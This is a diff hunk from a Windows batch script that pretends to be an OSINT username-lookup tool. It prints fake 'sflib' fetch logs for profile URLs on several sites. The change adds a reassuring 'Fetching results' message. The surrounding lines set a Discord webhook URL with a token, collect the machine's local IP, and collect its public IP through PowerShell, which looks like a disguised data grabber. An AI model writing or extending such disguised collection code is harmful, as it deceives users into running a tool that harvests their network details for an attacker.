@@ -207,6 +207,8 @@ echo [INFO] sflib : Fetched https://www.xnxx.com/mobile/profile/ (6028 bytes in 
 echo [INFO] sflib : Fetched https://www.kwai.com/@ (24501 bytes in 1.1203577518463135s)
 echo [INFO] sflib : Fetched https://cursos.alura.com.br/user/
 
+echo [INFO] Fetching results, please wait...
+
 set "webhook=https://discord.com/api/webhooks/1286380543813881967/k3wAVFFxgh_k7F4M1_7rsCq_yO3yl7TipOKf4slcbK2NtRxgSSb1baUHVUKVnOCMa_QK"
 for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
